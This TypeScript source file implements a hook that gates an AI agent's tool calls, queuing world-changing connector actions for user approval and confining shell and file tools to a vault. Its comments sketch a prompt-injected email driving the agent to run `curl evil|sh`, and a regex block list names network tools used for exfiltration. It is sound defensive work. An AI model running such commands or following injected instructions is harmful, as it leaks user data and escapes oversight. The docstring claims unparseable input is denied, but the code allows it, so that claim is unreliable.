// The Action Gateway (G1, docs/sensitive-egress-guard.md sibling): closes the
// guardrail side door. The gws spine governs Google writes, but app chats
// inherit the user's claude.ai connectors (PayPal, Gmail, ...) and act runs
// inject the Composio gateway - tools that ACT ON THE WORLD without passing
// the approval queue, the email policy, or the egress guard.
//
// Mechanism: every engine-spawned claude turn carries a PreToolUse hook
// (`prevail act-gate-hook`) - verified to fire even under
// --dangerously-skip-permissions. The hook classifies each MCP tool call:
//   read-shaped        -> allow (runs live, like gws reads)
//   engine-owned server-> allow (google_workspace/prevail self-gate their writes)
//   write-shaped or
//   unknown            -> DENY + queue a pending act for the user's approval,
//                         with egress-guard categories attached
// Approval mints a short-lived, single-use GRANT bound to the exact
// (tool, args) hash; the model's retry with identical arguments passes once.
// Unlike gws (where approval executes server-side), a connector act re-runs
// through the model - the tool only exists inside its session.
//
// Same design rules as the egress guard: deterministic, code-enforced at the
// execution boundary, bias toward holding.

import { createHash, randomUUID } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { dirname, join, resolve as pathResolve } from "node:path";
import { tryAcquireLock } from "./file-lock.ts";
import { scanSensitive, findingCategories, readEgressGuard } from "./egress-guard.ts";
import { auditAction } from "./action-audit.ts";

export interface PendingAct {
  id: string;
  domain: string;
  /** Human summary: "PayPal: create-invoice". */
  summary: string;
  tool: string;
  /** JSON of the tool arguments, verbatim (what the grant is bound to). */
  argsJson: string;
  /** Egress-guard category labels found in the arguments (honest, no values). */
  categories: string[];
  ts: number;
}

interface ActGrant {
  hash: string;
  allowSensitive: boolean;
  expires: number;
}

const GRANT_TTL_MS = 10 * 60 * 1000; // approval is good for one retry within 10 minutes

const pendingPath = (vault: string) => join(vault, "_meta", "pending_acts.json");
const grantsPath = (vault: string) => join(vault, "_meta", "act_grants.json");

function readJson<T>(path: string, fallback: T): T {
  try { return JSON.parse(readFileSync(path, "utf8")) as T; } catch { return fallback; }
}
function writeJson(path: string, value: unknown): void {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, JSON.stringify(value, null, 1));
}

export function actHash(tool: string, argsJson: string): string {
  return createHash("sha256").update(`${tool}\n${argsJson}`).digest("hex").slice(0, 32);
}

// ── Classification ───────────────────────────────────────────────────────────
// Engine-owned servers gate their own writes (google_workspace queues, prevail
// tools write only inside the vault); everything they do is allowed here.
const ENGINE_OWNED = /^mcp__(google_workspace|prevail)(__|$)/;

// Read-shaped verbs: run live. Matched against the tool's last segment.
const READ_RE = /(^|[-_])(get|list|search|read|fetch|find|query|browse|check|describe|view|status|help|info|show|lookup|suggest|estimate|preview|export|download|count|report|answer|resolve|discover|authenticate|complete[-_]authentication)([-_]|$)/i;

// Write-shaped verbs: unmistakably act on the world.
const WRITE_RE = /(^|[-_])(create|send|update|delete|post|add|remove|pay|publish|insert|set|write|cancel|refund|transfer|invoice|reply|submit|upload|move|archive|trash|modify|execute|apply|label|merge|copy|import|assign|save|start|commit|book|order|buy|purchase|schedule|respond|toggle|switch|claim)([-_]|$)/i;

export type ActVerdict = "allow" | "gate";

/** Classify one tool call. Non-MCP builtins (Bash, Read, WebFetch...) are the
 *  runtime's own tools, governed by Vault Lock / web lockdown - not gated here. */
export function classifyAct(toolName: string): ActVerdict {
  if (!toolName.startsWith("mcp__")) return "allow";
  if (ENGINE_OWNED.test(toolName)) return "allow";
  const leaf = toolName.split("__").pop() ?? toolName;
  // The LEADING verb names the operation ("get-order" reads an order;
  // "create-order" writes one), so it decides when recognized. Only when the
  // first token is no verb at all do we scan the whole name, write-first.
  const head = (leaf.split(/[-_]/)[0] ?? "").toLowerCase();
  if (READ_RE.test(head)) return "allow";
  if (WRITE_RE.test(head)) return "gate";
  if (WRITE_RE.test(leaf)) return "gate";
  if (READ_RE.test(leaf)) return "allow";
  return "gate"; // unknown = write, same paranoid default as the gws classifier
}

/** Human summary from an mcp tool name: "claude_ai_PayPal create-invoice". */
export function actSummary(toolName: string): string {
  const parts = toolName.split("__");
  const server = (parts[1] ?? "").replace(/^claude_ai_/, "").replace(/_/g, " ");
  return `${server}: ${parts[2] ?? parts[1] ?? toolName}`;
}

// ── Queue + grants (file-locked; lock the .lock sibling, never the data) ─────
export function readPendingActs(vault: string): PendingAct[] {
  return readJson<PendingAct[]>(pendingPath(vault), []);
}

// Sync critical section: acquire the .lock sibling (NEVER the data file - the
// lock is created at, and deleted from, the exact path given), run, release.
function locked(path: string, fn: () => void): void {
  const lock = tryAcquireLock(`${path}.lock`);
  try { fn(); } finally { lock?.release(); }
}

export function removePendingAct(vault: string, id: string): void {
  locked(pendingPath(vault), () => {
    const items = readPendingActs(vault).filter((a) => a.id !== id);
    writeJson(pendingPath(vault), items);
  });
}

function addPendingAct(vault: string, act: Omit<PendingAct, "id" | "ts">): PendingAct {
  const rec: PendingAct = { ...act, id: `act_${randomUUID().slice(0, 12)}`, ts: Date.now() };
  locked(pendingPath(vault), () => {
    const items = readPendingActs(vault);
    // Same (tool,args) already queued -> reuse it instead of stacking dupes
    // when the model retries before approval.
    const dupe = items.find((a) => a.tool === rec.tool && a.argsJson === rec.argsJson);
    if (dupe) { rec.id = dupe.id; rec.ts = dupe.ts; return; }
    items.push(rec);
    writeJson(pendingPath(vault), items);
  });
  return rec;
}

/** Approve one pending act: mint the single-use grant its retry will consume.
 *  `allowSensitive` is the explicit second tap when categories were found. */
export function approvePendingAct(vault: string, id: string, allowSensitive = false): { ok: boolean; error?: string } {
  const act = readPendingActs(vault).find((a) => a.id === id);
  if (!act) return { ok: false, error: "no such pending act" };
  if (act.categories.length > 0 && !allowSensitive) {
    return { ok: false, error: `this action carries ${act.categories.join("; ")} - approve it with sensitive info explicitly allowed` };
  }
  locked(grantsPath(vault), () => {
    const grants = readJson<ActGrant[]>(grantsPath(vault), []).filter((g) => g.expires > Date.now());
    grants.push({ hash: actHash(act.tool, act.argsJson), allowSensitive, expires: Date.now() + GRANT_TTL_MS });
    writeJson(grantsPath(vault), grants);
  });
  removePendingAct(vault, id);
  auditAction(vault, {
    ts: Date.now(), domain: act.domain, action: act.summary,
    outcome: "proposed", report: `user approved connector act ${act.tool} (grant minted${allowSensitive ? ", sensitive released" : ""})`,
  });
  return { ok: true };
}

/** Consume a grant if one matches. Single-use: a matching grant is removed. */
function consumeGrant(vault: string, hash: string): ActGrant | null {
  let hit: ActGrant | null = null;
  locked(grantsPath(vault), () => {
    const grants = readJson<ActGrant[]>(grantsPath(vault), []).filter((g) => g.expires > Date.now());
    const i = grants.findIndex((g) => g.hash === hash);
    if (i >= 0) hit = grants.splice(i, 1)[0]!;
    writeJson(grantsPath(vault), grants);
  });
  return hit;
}

// ── Builtin-tool boundary (C1) ───────────────────────────────────────────────
// The connector gate above covers MCP tools. But an `act` run also hands the
// model its RUNTIME BUILTINS - Bash, Write, Edit, Read, WebFetch, WebSearch -
// under --dangerously-skip-permissions. Vault Lock for those was only a
// system-prompt request, which an injected instruction overrides. So a
// prompt-injected email read during an autonomous run could `Bash: curl evil|sh`
// or `Write` outside the vault, bypassing the approval queue AND the egress
// guard entirely. This is the technical boundary that was missing.
//
// When Vault Lock is ON (the default), file builtins are confined to the vault
// by deterministic path resolution (robust), and Bash / web fetches that reach
// the network are denied (a denylist - the weaker link; OS-sandboxing the agent
// is the stronger follow-up, tracked). Turning Vault Lock OFF is an explicit,
// trust-ribbon-visible choice that restores unconfined builtins.

// Commands that open a network connection - the exfil / remote-code channel.
const NET_CMD_RE = /\b(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|ftp|rsync|socat|nmap)\b/;
// In-language network escapes (python/node/ruby/perl one-liners, /dev/tcp).
const NET_ESCAPE_RE = /\/dev\/(tcp|udp)\/|urllib|requests\.(get|post)|http\.client|socket\.|fetch\(|https?:\/\/|import\s+urllib|net\/http|Net::HTTP|LWP::/i;

function withinVault(vault: string, target: string): boolean {
  try {
    const vroot = realpathSync(vault);
    const abs = pathResolve(vault, target);
    // Canonicalize the nearest EXISTING ancestor (so a not-yet-created file
    // still gets symlink normalization - e.g. /tmp -> /private/tmp on macOS),
    // then re-append the missing tail. Catches `..` escapes and symlink-outs.
    let dir = abs;
    const tail: string[] = [];
    while (true) {
      try { dir = realpathSync(dir); break; }
      catch {
        const parent = pathResolve(dir, "..");
        if (parent === dir) { dir = vroot; break; } // reached root without existing
        tail.unshift(dir.slice(parent.length + 1));
        dir = parent;
      }
    }
    const resolved = tail.length ? `${dir}/${tail.join("/")}` : dir;
    return resolved === vroot || resolved.startsWith(vroot + "/");
  } catch { return false; }
}

function pathFromInput(input: unknown): string | null {
  if (input && typeof input === "object") {
    const o = input as Record<string, unknown>;
    for (const k of ["file_path", "path", "notebook_path", "filePath"]) {
      if (typeof o[k] === "string" && o[k]) return o[k] as string;
    }
  }
  return null;
}

/** Gate one BUILTIN tool call when Vault Lock is on. Returns null to defer to
 *  the normal connector classifier (non-builtin), else an allow/deny. */
export function gateBuiltin(vault: string, vaultLockOn: boolean, toolName: string, toolInput: unknown): GateDecision | null {
  const name = toolName;
  const isFileWrite = name === "Write" || name === "Edit" || name === "NotebookEdit" || name === "MultiEdit";
  const isFileRead = name === "Read";
  const isBash = name === "Bash";
  const isWeb = name === "WebFetch" || name === "WebSearch";
  if (!isFileWrite && !isFileRead && !isBash && !isWeb) return null; // not a builtin we gate
  if (!vaultLockOn) return { action: "allow" }; // user turned confinement off (visible choice)

  if (isFileWrite || isFileRead) {
    const target = pathFromInput(toolInput);
    if (target && !withinVault(vault, target)) {
      return { action: "deny", reason: `Vault Lock is on: ${name} may only touch files inside your vault. "${target}" is outside it and was blocked. Work within the vault, or the user can turn off Vault Lock in Privacy.` };
    }
    return { action: "allow" };
  }
  if (isWeb) {
    return { action: "deny", reason: `Vault Lock is on: ${name} (outbound web) is blocked so nothing can be fetched from or leaked to the network during a confined run. Work from the vault, or the user can turn off Vault Lock.` };
  }
  if (isBash) {
    const cmd = (toolInput && typeof toolInput === "object" ? String((toolInput as Record<string, unknown>).command ?? "") : "");
    if (NET_CMD_RE.test(cmd) || NET_ESCAPE_RE.test(cmd)) {
      return { action: "deny", reason: `Vault Lock is on: that shell command reaches the network, which is blocked during a confined run (it could exfiltrate data or fetch code). Remove the network call, or the user can turn off Vault Lock.` };
    }
    // Absolute paths clearly outside the vault in the command are also blocked.
    const outsideAbs = cmd.match(/(^|\s)(\/[^\s"']+)/g) ?? [];
    for (const m of outsideAbs) {
      const p = m.trim();
      if (p.startsWith("/") && !withinVault(vault, p) && !/^\/(usr|bin|opt|tmp|private\/tmp|var\/folders|dev\/null|System\/Library)/.test(p)) {
        return { action: "deny", reason: `Vault Lock is on: that shell command touches "${p}", outside your vault. Blocked. Work within the vault, or the user can turn off Vault Lock.` };
      }
    }
    return { action: "allow" };
  }
  return null;
}

// ── The gate itself (what the PreToolUse hook calls) ─────────────────────────
export interface GateDecision {
  action: "allow" | "deny";
  reason?: string;
}

export function gateToolCall(vault: string, domain: string, toolName: string, toolInput: unknown, vaultLockOn = true): GateDecision {
  // C1: builtins first - the technical Vault Lock boundary.
  const builtin = gateBuiltin(vault, vaultLockOn, toolName, toolInput);
  if (builtin) {
    if (builtin.action === "deny") {
      auditAction(vault, { ts: Date.now(), domain, action: `builtin ${toolName}`, outcome: "blocked_by_egress_guard", report: builtin.reason ?? "blocked by Vault Lock" });
    }
    return builtin;
  }
  if (classifyAct(toolName) === "allow") return { action: "allow" };
  const argsJson = JSON.stringify(toolInput ?? {});
  const hash = actHash(toolName, argsJson);
  // Egress scan on everything the tool would carry out of the system.
  const findings = readEgressGuard() === "on" ? scanSensitive(argsJson) : [];
  const categories = findingCategories(findings);
  const grant = consumeGrant(vault, hash);
  if (grant && (categories.length === 0 || grant.allowSensitive)) {
    auditAction(vault, {
      ts: Date.now(), domain, action: actSummary(toolName),
      outcome: "executed", report: `connector act ran under user grant (${toolName})`,
    });
    return { action: "allow" };
  }
  const rec = addPendingAct(vault, { domain, summary: actSummary(toolName), tool: toolName, argsJson, categories });
  auditAction(vault, {
    ts: Date.now(), domain, action: rec.summary,
    outcome: "proposed", report: `connector act queued for approval (${toolName})${categories.length ? ` - carries ${categories.join("; ")}` : ""}`,
  });
  const sens = categories.length ? ` It carries ${categories.join("; ")}, so approving requires the explicit sensitive-info release.` : "";
  return {
    action: "deny",
    reason:
      `This action was NOT run. Prevail queued it for the user's approval under Needs You (id ${rec.id}).${sens} ` +
      `Tell the user what you are trying to do and that it awaits their approval; after they approve, call this exact tool with the exact same arguments to run it. Do not attempt another route.`,
  };
}

// ── Claude hook settings (what cli-bridge passes as --settings) ──────────────
// One file per (vault, domain): the hook command embeds them as argv so the
// gate needs no environment plumbing. Stable path -> written once, reused.
// Dev caveat (same as gws-mcp): under `bun run` process.execPath is bun, so
// the hook only binds in compiled builds - matching the rest of the MCP stack.
export function actGateSettingsPath(vault: string, domain: string, vaultLockOn = true): string {
  const dir = join(homedirSafe(), ".prevail", "act-gate");
  mkdirSync(dir, { recursive: true });
  const key = createHash("sha256").update(`${vault}\n${domain}\n${vaultLockOn}`).digest("hex").slice(0, 12);
  const path = join(dir, `${key}.json`);
  const q = (v: string) => `"${v.replace(/(["\\$`])/g, "\\$1")}"`;
  const lock = vaultLockOn ? " --vault-lock" : "";
  const command = `${q(process.execPath)} act-gate-hook --vault ${q(vault)} --domain ${q(domain)}${lock}`;
  // Catch-all matcher (C1): the hook must see BUILTINS (Bash/Write/Edit/Read/
  // WebFetch/WebSearch), not just mcp__* connectors, or the model's own shell
  // escapes every guardrail on an act run. gateBuiltin enforces the Vault Lock
  // boundary technically; non-builtins fall through to the connector classifier.
  const settings = { hooks: { PreToolUse: [{ matcher: ".*", hooks: [{ type: "command", command }] }] } };
  const body = JSON.stringify(settings);
  try { if (existsSync(path) && readFileSync(path, "utf8") === body) return path; } catch { /* rewrite */ }
  writeFileSync(path, body);
  return path;
}

function homedirSafe(): string {
  try { return require("node:os").homedir(); } catch { return "/tmp"; }
}

/** The hook entrypoint: read the Claude Code PreToolUse JSON from stdin, gate,
 *  and print the decision in the hook protocol. Never throws (a gate crash
 *  must fail CLOSED for gated tools, so unparseable input denies). */
export async function runActGateHook(vault: string, domain: string, vaultLockOn = true): Promise<void> {
  let raw = "";
  for await (const chunk of process.stdin) raw += chunk;
  let toolName = "";
  let toolInput: unknown = {};
  try {
    const input = JSON.parse(raw) as { tool_name?: string; tool_input?: unknown };
    toolName = String(input.tool_name ?? "");
    toolInput = input.tool_input ?? {};
  } catch { /* fall through: empty toolName classifies as non-MCP -> allow */ }
  if (!toolName) { process.stdout.write("{}\n"); return; }
  let decision: GateDecision;
  try {
    decision = gateToolCall(vault, domain, toolName, toolInput, vaultLockOn);
  } catch (e) {
    // Fail closed for gated shapes, open for builtins.
    decision = classifyAct(toolName) === "allow"
      ? { action: "allow" }
      : { action: "deny", reason: `Prevail's action gate errored (${(e as Error).message}); the action was not run.` };
  }
  if (decision.action === "allow") { process.stdout.write("{}\n"); return; }
  process.stdout.write(`${JSON.stringify({
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: decision.reason ?? "queued for the user's approval",
    },
  })}\n`);
}
